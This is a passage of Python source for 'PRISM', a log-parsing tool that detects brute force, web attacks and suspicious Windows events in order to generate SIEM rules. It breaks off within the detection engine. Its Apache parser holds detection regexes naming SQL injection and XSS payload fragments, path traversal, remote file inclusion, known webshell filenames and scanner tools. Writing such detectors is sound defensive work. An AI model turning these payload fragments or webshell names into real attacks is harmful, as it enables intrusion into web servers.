#!/usr/bin/env python3
"""
PRISM - SIEM Rule Generator from Raw Logs (SINGLE-FILE EDITION)

Everything PRISM needs - parsers, the detection engine, the Sigma/Splunk
rule generators, the pipeline orchestrator, and the CLI - is combined into
this one file so it can be run with a single click / single command:

    python PRISM_onefile.py

No other project files are required for it to run. Only the two
third-party packages in requirements.txt (rich, pyyaml) need to be
installed - the launcher scripts (run_prism.sh / run_prism.bat) handle
that automatically.
"""

import argparse
import sys
import os
import re
import csv
import io
import json
import time
import uuid
from pathlib import Path
from datetime import date
from datetime import datetime
from collections import defaultdict, Counter
import xml.etree.ElementTree as ET
from urllib.parse import unquote
from rich import box
from rich.console import Console, Group
from rich.theme import Theme
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from rich.table import Table
from rich.text import Text
from rich.align import Align
from rich.rule import Rule
from rich.box import HEAVY, ROUNDED
from rich.prompt import Prompt, IntPrompt, Confirm
import yaml
from collections import Counter


# ==============================================================================
# SOURCE: parsers/common.py
# ==============================================================================
"""
common.py — shared helpers for structured log formats (CSV / JSON / XML).

These formats don't have one fixed schema like auth.log or Apache combined
format, so instead of writing a regex per vendor, we normalize whatever
field names show up (e.g. "src_ip", "ClientIP", "source_address") onto a
small set of canonical fields, then run the same enrichment + detection
logic on top regardless of where the data came from.
"""

# canonical_field -> list of header/key names (already lowercased, spaces/
# dashes collapsed to underscores) that should map onto it.
FIELD_ALIASES = {
    "src_ip": [
        "src_ip", "srcip", "source_ip", "sourceipaddress", "sourceaddress",
        "client_ip", "clientip", "remote_addr", "remoteip", "ip", "sip",
        "ip_address", "ipaddress",
    ],
    "dst_ip": [
        "dst_ip", "dstip", "dest_ip", "destination_ip", "destinationaddress",
        "dip", "server_ip",
    ],
    "dst_port": ["dst_port", "dstport", "dest_port", "destination_port", "port"],
    "username": [
        "user", "username", "user_name", "account", "accountname",
        "account_name", "useridentity", "identity", "principal", "src_user",
        "subjectusername", "targetusername", "actor",
    ],
    "action": [
        "action", "eventname", "event_name", "event_type", "eventaction",
        "operation", "verb", "rule_action",
    ],
    "status": [
        "status", "result", "outcome", "disposition", "response",
        "decision", "responseelements_result",
    ],
    "status_code": [
        "status_code", "statuscode", "http_status", "responsecode", "code",
    ],
    "event_id": ["event_id", "eventid", "eventcode", "eventid_qualifiers", "id"],
    "message": [
        "message", "msg", "description", "errormessage", "error_message",
        "details", "errorcode",
    ],
    "timestamp": [
        "timestamp", "time", "datetime", "eventtime", "ts", "@timestamp",
        "event_time", "creationtime",
    ],
    "host": ["host", "hostname", "computer", "device", "sourcehost", "workstationname"],
    "user_agent": ["user_agent", "useragent", "http_user_agent", "useragentstring"],
    "protocol": ["protocol", "proto"],
}

# API calls / event names that are almost always worth a SOC analyst's
# attention when they show up in cloud audit trails or admin logs.
SENSITIVE_ACTIONS = [
    "createuser", "deleteuser", "createaccesskey", "attachuserpolicy",
    "attachrolepolicy", "putuserpolicy", "putrolepolicy",
    "deletetrail", "stoplogging", "updatetrail",
    "authorizesecuritygroupingress", "authorizesecuritygroupegress",
    "consolelogin", "assumerole", "createrole", "deleterole",
    "disablekey", "deletekey", "putbucketpolicy", "putbucketacl",
    "deletebucketpolicy", "modifyloginprofile", "deactivatemfadevice",
    "creategroup", "addusertogroup", "createpolicyversion",
]

# Windows Security Event IDs worth flagging — reused across the windows
# text parser AND any structured format (CSV/JSON/XML) that happens to
# carry an event_id field, e.g. an exported/forwarded Windows event.
SUSPICIOUS_EIDS = {
    4625: "failed_logon",
    4648: "explicit_credentials_logon",
    4672: "privileged_logon",
    4697: "service_install",
    4698: "scheduled_task_created",
    4720: "user_account_created",
    4724: "password_reset_attempt",
    4728: "member_added_to_security_group",
    4732: "member_added_to_local_group",
    4756: "member_added_to_universal_group",
    4776: "credential_validation",
    4768: "kerberos_tgt_request",
    4769: "kerberos_service_ticket",
    4771: "kerberos_preauth_failed",
    1102: "audit_log_cleared",
    4946: "firewall_rule_added",
    7045: "new_service_installed",
}

_FAIL_WORDS = {"fail", "failed", "failure", "unauthorized", "invalid", "denied", "deny"}
_SUCCESS_WORDS = {"success", "succeeded", "accepted", "ok", "allow", "allowed", "permit"}
_DENY_WORDS = {"deny", "denied", "block", "blocked", "drop", "dropped", "reject", "rejected", "refuse", "refused"}
_AUTH_HINT_WORDS = ("login", "logon", "signin", "sign-in", "auth", "session", "consolelogin")


def _clean_key(k: str) -> str:
    return re.sub(r"[\s\-]+", "_", str(k).strip().lower())


def flatten(obj, prefix=""):
    """Flatten a nested dict/list (e.g. parsed JSON or XML) into a single
    level dict with dot-joined keys, so 'userIdentity.userName' becomes
    a matchable key alongside top-level fields."""
    flat = {}
    if isinstance(obj, dict):
        for k, v in obj.items():
            key = f"{prefix}.{k}" if prefix else str(k)
            flat.update(flatten(v, key))
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            flat.update(flatten(v, f"{prefix}[{i}]" if prefix else str(i)))
    else:
        flat[prefix] = obj
    return flat


def normalize_record(raw_fields: dict, raw_text: str = "") -> dict:
    """Take an arbitrary flat dict of fields (already flattened) and return
    an enriched entry dict with canonical fields + generic detection flags,
    while preserving all original fields under entry['fields']."""
    entry = {"raw": raw_text or str(raw_fields), "fields": raw_fields}

    lookup = {_clean_key(k.split(".")[-1]): v for k, v in raw_fields.items() if v not in (None, "")}

    for canonical, aliases in FIELD_ALIASES.items():
        for alias in aliases:
            if alias in lookup:
                entry[canonical] = lookup[alias]
                break

    if "event_id" in entry:
        try:
            entry["event_id"] = int(re.search(r"\d+", str(entry["event_id"])).group())
        except (AttributeError, ValueError):
            pass

    if "status_code" in entry:
        try:
            entry["status_code"] = int(re.search(r"\d+", str(entry["status_code"])).group())
        except (AttributeError, ValueError):
            entry.pop("status_code", None)

    enrich_generic(entry)
    return entry


def enrich_generic(entry: dict):
    status_blob = " ".join(str(entry.get(k, "")) for k in ("status", "action", "message")).lower()
    action_blob = str(entry.get("action", "")).lower()
    username = str(entry.get("username", "")).lower()
    eid = entry.get("event_id")

    is_auth_context = any(h in status_blob for h in _AUTH_HINT_WORDS) or any(
        h in action_blob for h in _AUTH_HINT_WORDS
    )

    entry["is_denied"] = any(w in status_blob for w in _DENY_WORDS)
    entry["is_failed_auth"] = is_auth_context and any(w in status_blob for w in _FAIL_WORDS)
    entry["is_success_auth"] = is_auth_context and any(w in status_blob for w in _SUCCESS_WORDS)
    entry["is_sensitive_action"] = any(sa in action_blob.replace(" ", "") for sa in SENSITIVE_ACTIONS)
    entry["is_admin_user"] = bool(re.search(r"\b(root|admin|administrator)\b", username))

    sc = entry.get("status_code")
    entry["is_error_status"] = isinstance(sc, int) and sc >= 400

    if eid is not None:
        entry["event_type"] = SUSPICIOUS_EIDS.get(eid, "generic")
        entry["is_failed_logon"] = eid == 4625
        entry["is_privileged_logon"] = eid == 4672
        entry["is_service_install"] = eid in (4697, 7045)
        entry["is_scheduled_task"] = eid == 4698
        entry["is_account_created"] = eid == 4720
        entry["is_group_modified"] = eid in (4728, 4732, 4756)
        entry["is_log_cleared"] = eid == 1102
        entry["is_kerberoast"] = eid == 4769


# ==============================================================================
# SOURCE: parsers/auth_parser.py
# ==============================================================================
"""
AuthLogParser — parses Linux auth.log / syslog format
"""

# Common auth.log line format:
# Jan 10 04:18:23 hostname sshd[12345]: Failed password for root from 1.2.3.4 port 22 ssh2
AUTH_LINE_RE = re.compile(
    r"(?P<month>\w{3})\s+(?P<day>\d{1,2})\s+(?P<time>\d{2}:\d{2}:\d{2})\s+"
    r"(?P<host>\S+)\s+(?P<process>[^\[:\s]+)(?:\[(?P<pid>\d+)\])?:\s+(?P<message>.+)"
)


class AuthLogParser:
    def __init__(self, verbose=False):
        self.verbose = verbose

    def parse(self, content: str) -> list[dict]:
        entries = []
        for line in content.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue

            m = AUTH_LINE_RE.match(line)
            if m:
                entry = {
                    "raw": line,
                    "month": m.group("month"),
                    "day": m.group("day"),
                    "time": m.group("time"),
                    "host": m.group("host"),
                    "process": m.group("process"),
                    "pid": m.group("pid"),
                    "message": m.group("message"),
                }
                # Extract common auth fields
                self._enrich(entry)
                entries.append(entry)
            else:
                # Store unmatched lines as generic
                entries.append({"raw": line, "message": line, "process": ""})

        return entries

    def _enrich(self, entry: dict):
        msg = entry["message"]

        # Extract IP address
        ip_match = re.search(r"from\s+(\d{1,3}(?:\.\d{1,3}){3})", msg)
        if ip_match:
            entry["src_ip"] = ip_match.group(1)

        # Extract username
        user_match = re.search(r"(?:for|user)\s+(\S+)(?:\s+from)?", msg, re.IGNORECASE)
        if user_match:
            entry["username"] = user_match.group(1)

        # Extract port
        port_match = re.search(r"port\s+(\d+)", msg, re.IGNORECASE)
        if port_match:
            entry["port"] = port_match.group(1)

        # Auth result flags
        entry["is_failed_auth"] = bool(re.search(r"Failed\s+(password|publickey)", msg, re.IGNORECASE))
        entry["is_accepted_auth"] = bool(re.search(r"Accepted\s+(password|publickey)", msg, re.IGNORECASE))
        entry["is_invalid_user"] = bool(re.search(r"Invalid\s+user", msg, re.IGNORECASE))
        entry["is_sudo"] = "sudo" in entry.get("process", "").lower()
        entry["is_root_login"] = "root" in msg.lower() and entry["is_failed_auth"]
        entry["is_disconnected"] = bool(re.search(r"Disconnect", msg, re.IGNORECASE))
        entry["is_session_opened"] = bool(re.search(r"session\s+opened", msg, re.IGNORECASE))
        entry["is_session_closed"] = bool(re.search(r"session\s+closed", msg, re.IGNORECASE))


# ==============================================================================
# SOURCE: parsers/apache_parser.py
# ==============================================================================
"""
ApacheLogParser — parses Apache/Nginx Combined Log Format
"""

# 1.2.3.4 - frank [10/Oct/2000:13:55:36 -0700] "GET /apache_pb.gif HTTP/1.0" 200 2326 "http://ref/" "Mozilla/..."
APACHE_LINE_RE = re.compile(
    r'(?P<ip>\S+)\s+\S+\s+(?P<user>\S+)\s+\[(?P<time>[^\]]+)\]\s+'
    r'"(?P<method>\S+)\s+(?P<path>\S+)\s+(?P<proto>[^"]+)"\s+'
    r'(?P<status>\d{3})\s+(?P<size>\S+)'
    r'(?:\s+"(?P<referer>[^"]*)")?'
    r'(?:\s+"(?P<useragent>[^"]*)")?'
)


class ApacheLogParser:
    def __init__(self, verbose=False):
        self.verbose = verbose

    def parse(self, content: str) -> list[dict]:
        entries = []
        for line in content.splitlines():
            line = line.strip()
            if not line:
                continue

            m = APACHE_LINE_RE.match(line)
            if m:
                entry = {
                    "raw": line,
                    "src_ip": m.group("ip"),
                    "username": m.group("user"),
                    "timestamp": m.group("time"),
                    "method": m.group("method"),
                    "path": unquote(m.group("path")),
                    "protocol": m.group("proto"),
                    "status": int(m.group("status")),
                    "size": m.group("size"),
                    "referer": m.group("referer") or "",
                    "useragent": m.group("useragent") or "",
                }
                self._enrich(entry)
                entries.append(entry)
            else:
                entries.append({"raw": line, "message": line})

        return entries

    def _enrich(self, entry: dict):
        path = entry["path"].lower()
        ua = entry["useragent"].lower()
        status = entry["status"]

        # Path-based flags
        entry["is_sqli"] = bool(re.search(
            r"(union\s+select|select\s+.*\s+from|insert\s+into|drop\s+table|'--|\bor\b.+=.+|1=1|1'='1)",
            path, re.IGNORECASE
        ))
        entry["is_xss"] = bool(re.search(
            r"(<script|javascript:|onerror=|onload=|<img.*src=|alert\(|document\.cookie)",
            path, re.IGNORECASE
        ))
        entry["is_path_traversal"] = bool(re.search(r"\.\./|\.\.\\|%2e%2e", path, re.IGNORECASE))
        entry["is_rfi"] = bool(re.search(r"(https?://|ftp://)\S+\.(php|pl|py|sh)", path, re.IGNORECASE))
        entry["is_webshell"] = bool(re.search(
            r"(cmd\.php|shell\.php|c99\.php|r57\.php|webshell|b374k|chopper)", path, re.IGNORECASE
        ))
        entry["is_scanner"] = bool(re.search(
            r"(nikto|nmap|masscan|sqlmap|dirbuster|gobuster|wfuzz|burp|acunetix|nessus)",
            ua, re.IGNORECASE
        ))
        entry["is_4xx"] = 400 <= status < 500
        entry["is_5xx"] = 500 <= status < 600
        entry["is_admin_access"] = bool(re.search(r"/(admin|wp-admin|phpmyadmin|manager|console)", path))
        entry["is_backup_file"] = bool(re.search(r"\.(bak|sql|tar|zip|gz|backup|old)$", path))


# ==============================================================================
# SOURCE: parsers/windows_parser.py
# ==============================================================================
"""
WindowsLogParser — parses Windows Security Event log (text export format)
Supports both tab-delimited exports and key: value style logs
"""

WINDOWS_LINE_RE = re.compile(
    r"(?P<date>\d{1,2}/\d{1,2}/\d{4})\s+(?P<time>\d{1,2}:\d{2}:\d{2}\s*(?:AM|PM)?)\s+"
    r"(?P<source>\S+)\s+(?P<event_id>\d+)\s+(?P<category>[^\t]+)\t(?P<message>.+)",
    re.IGNORECASE,
)

KV_EVENT_RE = re.compile(r"EventID:\s*(\d+)", re.IGNORECASE)


class WindowsLogParser:
    def __init__(self, verbose=False):
        self.verbose = verbose

    def parse(self, content: str) -> list[dict]:
        entries = []
        # Try to detect if it's a multi-line event block format
        if "EventID:" in content or "Account Name:" in content:
            entries = self._parse_kv_blocks(content)
        else:
            entries = self._parse_tabular(content)
        return entries

    def _parse_tabular(self, content: str) -> list[dict]:
        entries = []
        for line in content.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            m = WINDOWS_LINE_RE.match(line)
            if m:
                entry = {
                    "raw": line,
                    "date": m.group("date"),
                    "time": m.group("time"),
                    "source": m.group("source"),
                    "event_id": int(m.group("event_id")),
                    "category": m.group("category").strip(),
                    "message": m.group("message").strip(),
                }
                self._enrich(entry)
                entries.append(entry)
            else:
                # Fallback: try to extract an EventID
                eid_m = KV_EVENT_RE.search(line)
                if eid_m:
                    entry = {"raw": line, "event_id": int(eid_m.group(1)), "message": line}
                    self._enrich(entry)
                    entries.append(entry)
        return entries

    def _parse_kv_blocks(self, content: str) -> list[dict]:
        """Parse Windows event log exports in key: value block format"""
        entries = []
        blocks = re.split(r"\n{2,}", content)
        for block in blocks:
            if not block.strip():
                continue
            entry = {"raw": block}
            # Extract common fields
            for key, pattern in [
                ("event_id", r"(?:EventID|Event\s+ID)[:\s]+(\d+)"),
                ("username", r"Account\s+Name[:\s]+(\S+)"),
                ("src_ip", r"(?:Source\s+Network\s+Address|IP\s+Address)[:\s]+(\d{1,3}(?:\.\d{1,3}){3})"),
                ("logon_type", r"Logon\s+Type[:\s]+(\d+)"),
                ("workstation", r"Workstation\s+Name[:\s]+(\S+)"),
                ("process_name", r"Process\s+Name[:\s]+(.+)"),
                ("timestamp", r"(?:Date|Time)[:\s]+([\d/: APM]+)"),
            ]:
                m = re.search(pattern, block, re.IGNORECASE)
                if m:
                    entry[key] = m.group(1).strip()

            if "event_id" in entry:
                entry["event_id"] = int(entry["event_id"])
            entry["message"] = block[:200]
            self._enrich(entry)
            entries.append(entry)
        return entries

    def _enrich(self, entry: dict):
        eid = entry.get("event_id", 0)

        # Map Windows Event IDs to known attack patterns
        SUSPICIOUS_EIDS = {
            4625: "failed_logon",
            4648: "explicit_credentials_logon",
            4672: "privileged_logon",
            4697: "service_install",
            4698: "scheduled_task_created",
            4720: "user_account_created",
            4724: "password_reset_attempt",
            4728: "member_added_to_security_group",
            4732: "member_added_to_local_group",
            4756: "member_added_to_universal_group",
            4776: "credential_validation",
            4768: "kerberos_tgt_request",
            4769: "kerberos_service_ticket",
            4771: "kerberos_preauth_failed",
            1102: "audit_log_cleared",
            4946: "firewall_rule_added",
            7045: "new_service_installed",
        }

        entry["event_type"] = SUSPICIOUS_EIDS.get(eid, "generic")
        entry["is_failed_logon"] = eid == 4625
        entry["is_pass_the_hash"] = eid == 4624 and entry.get("logon_type") == "3"
        entry["is_privileged_logon"] = eid == 4672
        entry["is_service_install"] = eid in (4697, 7045)
        entry["is_scheduled_task"] = eid == 4698
        entry["is_account_created"] = eid == 4720
        entry["is_group_modified"] = eid in (4728, 4732, 4756)
        entry["is_log_cleared"] = eid == 1102
        entry["is_kerberoast"] = eid == 4769


# ==============================================================================
# SOURCE: parsers/csv_parser.py
# ==============================================================================
"""
CSVLogParser — parses arbitrary CSV-style logs (firewall exports, proxy logs,
EDR exports, generic SOC tool exports, etc).

There's no single "CSV log" schema, so this parser doesn't assume one. It
sniffs the delimiter, reads whatever header row is present, and normalizes
recognized column names (src_ip, user, status, action, ...) onto canonical
fields via parsers/common.py so the rest of the pipeline can reason about it
the same way it does auth/apache/windows logs.
"""

class CSVLogParser:
    def __init__(self, verbose=False):
        self.verbose = verbose

    def parse(self, content: str) -> list[dict]:
        content = content.lstrip("\ufeff")  # strip BOM if present
        lines = [l for l in content.splitlines() if l.strip()]
        if not lines:
            return []

        delimiter = self._sniff_delimiter(lines[0])

        reader = csv.reader(io.StringIO(content), delimiter=delimiter)
        rows = [r for r in reader if any(c.strip() for c in r)]
        if not rows:
            return []

        header = [h.strip() for h in rows[0]]
        entries = []

        for i, row in enumerate(rows[1:], start=1):
            # pad/truncate ragged rows instead of dropping them
            if len(row) < len(header):
                row = row + [""] * (len(header) - len(row))
            elif len(row) > len(header):
                row = row[: len(header)]

            raw_fields = dict(zip(header, row))
            raw_line = lines[i] if i < len(lines) else delimiter.join(row)
            entry = normalize_record(raw_fields, raw_line)
            entries.append(entry)

        return entries

    def _sniff_delimiter(self, header_line: str) -> str:
        candidates = [",", ";", "\t", "|"]
        counts = {d: header_line.count(d) for d in candidates}
        best = max(counts, key=lambda d: counts[d])
        return best if counts[best] > 0 else ","


# ==============================================================================
# SOURCE: parsers/json_parser.py
# ==============================================================================
"""
JSONLogParser — parses JSON-based logs: JSON Lines (one object per line),
a top-level JSON array of records, or a wrapper object containing a list
(e.g. AWS CloudTrail's {"Records": [...]}, or {"events": [...]}).

Nested objects (like CloudTrail's userIdentity block) are flattened so
fields such as "userIdentity.userName" can still be matched against the
canonical field aliases in parsers/common.py.
"""

# Common keys that wrap a list of actual log records
_LIST_WRAPPER_KEYS = ["Records", "records", "events", "Events", "logs", "entries", "data"]


class JSONLogParser:
    def __init__(self, verbose=False):
        self.verbose = verbose

    def parse(self, content: str) -> list[dict]:
        content = content.strip().lstrip("\ufeff")
        if not content:
            return []

        records = self._extract_records(content)
        entries = []
        for rec in records:
            if not isinstance(rec, dict):
                continue
            flat = flatten(rec)
            raw_text = json.dumps(rec, ensure_ascii=False)
            entries.append(normalize_record(flat, raw_text))
        return entries

    def _extract_records(self, content: str) -> list:
        # Try whole-content JSON first (array or wrapper object)
        try:
            parsed = json.loads(content)
            return self._records_from_parsed(parsed)
        except json.JSONDecodeError:
            pass

        # Fall back to JSON Lines — one JSON object per line
        records = []
        for line in content.splitlines():
            line = line.strip().rstrip(",")
            if not line:
                continue
            try:
                obj = json.loads(line)
            except json.JSONDecodeError:
                continue
            if isinstance(obj, dict):
                records.append(obj)
            elif isinstance(obj, list):
                records.extend(o for o in obj if isinstance(o, dict))
        return records

    def _records_from_parsed(self, parsed) -> list:
        if isinstance(parsed, list):
            return [r for r in parsed if isinstance(r, dict)]
        if isinstance(parsed, dict):
            for key in _LIST_WRAPPER_KEYS:
                if key in parsed and isinstance(parsed[key], list):
                    return [r for r in parsed[key] if isinstance(r, dict)]
            # single JSON object log — treat it as one record
            return [parsed]
        return []


# ==============================================================================
# SOURCE: parsers/xml_parser.py
# ==============================================================================
"""
XMLLogParser — parses XML-based logs: Windows Event XML exports
(<Event><System>...<EventData>...) and generic record-based XML logs
(e.g. <logs><entry>...</entry><entry>...</entry></logs>).

Each record element is flattened (tag text + attributes) into a dict and
normalized via parsers/common.py. Windows Event XML gets special handling
because its real fields live in <Data Name="...">value</Data> children
inside <EventData>, not as plain tag text.
"""

_NS_RE = re.compile(r"\{[^}]+\}")


def _strip_ns(tag: str) -> str:
    return _NS_RE.sub("", tag)


class XMLLogParser:
    def __init__(self, verbose=False):
        self.verbose = verbose

    def parse(self, content: str) -> list[dict]:
        content = content.strip().lstrip("\ufeff")
        if not content:
            return []

        root = self._safe_parse(content)
        if root is None:
            return []

        record_elements = self._find_record_elements(root)
        entries = []
        for el in record_elements:
            if _strip_ns(el.tag).lower() == "event":
                fields = self._flatten_windows_event(el)
            else:
                fields = self._flatten_element(el)
            raw_text = ET.tostring(el, encoding="unicode")
            entries.append(normalize_record(fields, raw_text))
        return entries

    def _safe_parse(self, content: str):
        """Many raw Windows event exports are a sequence of sibling <Event>
        blocks with no single root element, which isn't valid XML on its
        own — wrap it in a synthetic root if the first parse attempt fails."""
        try:
            return ET.fromstring(content)
        except ET.ParseError:
            wrapped = f"<PRISM_root>{content}</PRISM_root>"
            try:
                return ET.fromstring(wrapped)
            except ET.ParseError:
                return None

    def _find_record_elements(self, root) -> list:
        root_tag = _strip_ns(root.tag).lower()
        if root_tag == "event":
            return [root]

        children = list(root)
        if not children:
            return []

        # Most common case: root's direct children are all the same
        # repeating record tag (e.g. <Events><Event/><Event/></Events>,
        # <logs><entry/><entry/></logs>)
        tags = {_strip_ns(c.tag) for c in children}
        if len(tags) == 1:
            return children

        # Mixed bag — fall back to picking the most frequent child tag
        counts = Counter(_strip_ns(c.tag) for c in children)
        most_common_tag, _ = counts.most_common(1)[0]
        return [c for c in children if _strip_ns(c.tag) == most_common_tag]

    def _flatten_windows_event(self, event_el) -> dict:
        fields = {}
        for section in event_el:
            tag = _strip_ns(section.tag)
            if tag == "EventData" or tag == "UserData":
                for data in section.iter():
                    if _strip_ns(data.tag) == "Data":
                        name = data.get("Name")
                        if name:
                            fields[name] = (data.text or "").strip()
            else:
                # System block etc: flatten normally (EventID, TimeCreated, ...)
                fields.update(self._flatten_element(section, prefix=tag))
        return fields

    def _flatten_element(self, el, prefix="") -> dict:
        as_dict = self._element_to_dict(el)
        return flatten(as_dict, prefix)

    def _element_to_dict(self, el):
        d = {}
        d.update({f"@{k}": v for k, v in el.attrib.items()})
        children = list(el)
        if not children:
            text = (el.text or "").strip()
            if not d:
                # plain leaf element, e.g. <EventID>4625</EventID>
                return text
            if text:
                d["#text"] = text
            return d

        for child in children:
            tag = _strip_ns(child.tag)
            value = self._element_to_dict(child)
            if tag in d:
                if not isinstance(d[tag], list):
                    d[tag] = [d[tag]]
                d[tag].append(value)
            else:
                d[tag] = value
        return d


# ==============================================================================
# SOURCE: parsers/auto_parser.py
# ==============================================================================
"""
AutoParser — detects log format and routes to the correct parser
Supports: auth.log (syslog), Apache/Nginx access logs, Windows Security
Event logs (text or XML), CSV exports, and JSON / JSON Lines logs.
"""

SIGNATURES = {
    "auth": [
        r"sshd\[",
        r"sudo:\s+\w+",
        r"PAM:\s+",
        r"Failed password for",
        r"Accepted publickey",
        r"su\[",
    ],
    "apache": [
        r'"\s*(GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH)\s+/',
        r'\s+\d{3}\s+\d+\s+"https?://',
        r"Mozilla/\d+\.\d+",
        r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\s+-\s+-\s+\[",
    ],
    "windows": [
        r"EventID:\s*\d+",
        r"EventCode=\d+",
        r"Security\s+ID:",
        r"Logon\s+Type:",
        r"Account\s+Name:",
        r"Source\s+Network\s+Address:",
        r"Keywords:\s+Audit",
        r"Microsoft-Windows-\S+\s+\d+\s",
    ],
}

EXTENSION_MAP = {
    ".csv": "csv",
    ".tsv": "csv",
    ".json": "json",
    ".jsonl": "json",
    ".ndjson": "json",
    ".xml": "xml",
}

PARSER_MAP = {
    "auth": AuthLogParser,
    "apache": ApacheLogParser,
    "windows": WindowsLogParser,
    "csv": CSVLogParser,
    "json": JSONLogParser,
    "xml": XMLLogParser,
}


class AutoParser:
    def __init__(self, log_path: Path, console, verbose: bool):
        self.log_path = log_path
        self.console = console
        self.verbose = verbose

    def detect_type(self, sample: str) -> str:
        """Content-based detection, used when the file extension doesn't
        already tell us the format (e.g. .log, .txt, or no extension)."""
        stripped = sample.strip()

        # Structured-format sniffing first — these are easy to tell apart
        if stripped.startswith("<"):
            return "xml"
        if stripped.startswith("{") or stripped.startswith("["):
            if self._looks_like_json(stripped):
                return "json"
        if self._looks_like_csv(sample):
            return "csv"

        # Fall back to the original signature-based scoring for
        # unstructured/text logs (syslog, Apache, Windows text exports)
        scores = {log_type: 0 for log_type in SIGNATURES}
        for log_type, patterns in SIGNATURES.items():
            for pattern in patterns:
                if re.search(pattern, sample, re.IGNORECASE | re.MULTILINE):
                    scores[log_type] += 1

        best = max(scores, key=lambda k: scores[k])
        if scores[best] == 0:
            return "generic"
        return best

    def _looks_like_json(self, stripped: str) -> bool:
        # Whole-content parse is the most reliable signal
        try:
            json.loads(stripped)
            return True
        except json.JSONDecodeError:
            pass
        # JSON Lines: check the first non-empty line parses as an object
        for line in stripped.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                json.loads(line)
                return True
            except json.JSONDecodeError:
                return False
        return False

    def _looks_like_csv(self, sample: str) -> bool:
        lines = [l for l in sample.splitlines() if l.strip()][:5]
        if len(lines) < 2:
            return False
        for delim in (",", ";", "\t", "|"):
            counts = [l.count(delim) for l in lines]
            # Require at least 2 occurrences (3+ columns) so a single
            # tab/comma that happens to appear in every line of an
            # unstructured log (e.g. a tab-separated Windows text export)
            # doesn't get misdetected as CSV.
            if counts[0] > 1 and len(set(counts)) == 1:
                return True
        return False

    def _detect_from_extension(self):
        suffix = self.log_path.suffix.lower()
        return EXTENSION_MAP.get(suffix)

    def parse(self):
        with open(self.log_path, "r", errors="replace") as f:
            content = f.read()

        log_type = self._detect_from_extension()
        if log_type is None:
            sample = "\n".join(content.splitlines()[:50])
            log_type = self.detect_type(sample)

        if self.verbose:
            self.console.print(f"[dim]→ Detected log type: [bold]{log_type}[/bold][/dim]")

        parser_cls = PARSER_MAP.get(log_type, AuthLogParser)
        parser = parser_cls(self.verbose)
        entries = parser.parse(content)

        if self.verbose:
            self.console.print(f"[dim]→ Parsed [bold]{len(entries):,}[/bold] log entries[/dim]")

        return log_type, entries


# ==============================================================================
# SOURCE: detectors/detector_engine.py
# ==============================================================================
"""
DetectorEngine — applies behavioral detection rules to parsed log entries.
Returns a list of findings (matched patterns with metadata for rule generation).
"""

class DetectorEngine:
    def __init__(self, log_type: str, console, verbose: bool):
        self.log_type = log_type
        self.console = console
        self.verbose = verbose

    def analyze(self, entries: list[dict]) -> list[dict]:
        if self.log_type == "auth":
            return self._analyze_auth(entries)
        elif self.log_type == "apache":
            return self._analyze_apache(entries)
        elif self.log_type == "windows":
            return self._analyze_windows(entries)
        elif self.log_type in ("csv", "json", "xml", "generic"):
            return self._analyze_generic(entries)
        return []

    # ──────────────────────────────────────────────────────────────────
    # AUTH LOG DETECTIONS
    # ──────────────────────────────────────────────────────────────────

    def _analyze_auth(self, entries: list[dict]) -> list[dict]:
        findings = []

        failed_by_ip = defaultdict(list)
        failed_by_user = defaultdict(list)
        accepted_after_failed = {}
        invalid_users = set()
        root_attempts = []
        sudo_commands = []

        for e in entries:
            ip = e.get("src_ip", "")
            user = e.get("username", "")

            if e.get("is_failed_auth"):
                if ip:
                    failed_by_ip[ip].append(e)
                if user:
                    failed_by_user[user].append(e)
            if e.get("is_invalid_user") and user:
                invalid_users.add(user)
            if e.get("is_root_login"):
                root_attempts.append(e)
            if e.get("is_sudo"):
                sudo_commands.append(e)
            if e.get("is_accepted_auth") and ip and ip in failed_by_ip:
                accepted_after_failed[ip] = e

        # SSH Brute Force (>= 5 failures from same IP)
        brute_ips = {ip: evts for ip, evts in failed_by_ip.items() if len(evts) >= 5}
        if brute_ips:
            top_ip = max(brute_ips, key=lambda k: len(brute_ips[k]))
            findings.append({
                "rule_name": "ssh_brute_force_by_ip",
                "title": "SSH Brute Force from Single IP",
                "description": "Multiple failed SSH authentication attempts from the same source IP within a short period.",
                "severity": "high",
                "mitre_technique": "T1110.001 — Brute Force: Password Guessing",
                "hit_count": sum(len(v) for v in brute_ips.values()),
                "sample_entry": brute_ips[top_ip][0],
                "evidence": {
                    "offending_ips": list(brute_ips.keys())[:5],
                    "max_attempts": max(len(v) for v in brute_ips.values()),
                    "threshold": 5,
                },
                "keywords": ["Failed password", "Failed publickey"],
                "log_source": "auth",
            })

        # User enumeration — many distinct invalid usernames
        if len(invalid_users) >= 5:
            findings.append({
                "rule_name": "ssh_user_enumeration",
                "title": "SSH User Enumeration",
                "description": "Multiple invalid usernames attempted, suggesting automated user enumeration.",
                "severity": "medium",
                "mitre_technique": "T1087.001 — Account Discovery: Local Account",
                "hit_count": len(invalid_users),
                "sample_entry": entries[0] if entries else {},
                "evidence": {
                    "invalid_users_count": len(invalid_users),
                    "sample_users": list(invalid_users)[:10],
                },
                "keywords": ["Invalid user"],
                "log_source": "auth",
            })

        # Root login attempts
        if root_attempts:
            findings.append({
                "rule_name": "ssh_root_login_attempt",
                "title": "SSH Root Login Attempt",
                "description": "Direct SSH login attempts to the root account detected.",
                "severity": "high",
                "mitre_technique": "T1078.003 — Valid Accounts: Local Accounts",
                "hit_count": len(root_attempts),
                "sample_entry": root_attempts[0],
                "evidence": {"attempt_count": len(root_attempts)},
                "keywords": ["Failed password for root", "Failed password for invalid user root"],
                "log_source": "auth",
            })

        # Successful login after brute force (credential stuffing success)
        if accepted_after_failed:
            for ip, success_entry in list(accepted_after_failed.items())[:3]:
                findings.append({
                    "rule_name": "ssh_successful_login_after_brute_force",
                    "title": "Successful SSH Login Following Failed Attempts",
                    "description": "A successful SSH authentication was observed from an IP address that previously had multiple failures. Possible successful brute force.",
                    "severity": "critical",
                    "mitre_technique": "T1110 — Brute Force",
                    "hit_count": len(failed_by_ip.get(ip, [])),
                    "sample_entry": success_entry,
                    "evidence": {
                        "src_ip": ip,
                        "failed_before": len(failed_by_ip.get(ip, [])),
                    },
                    "keywords": ["Accepted password", "Accepted publickey"],
                    "log_source": "auth",
                })
                break  # one rule per pattern

        return findings

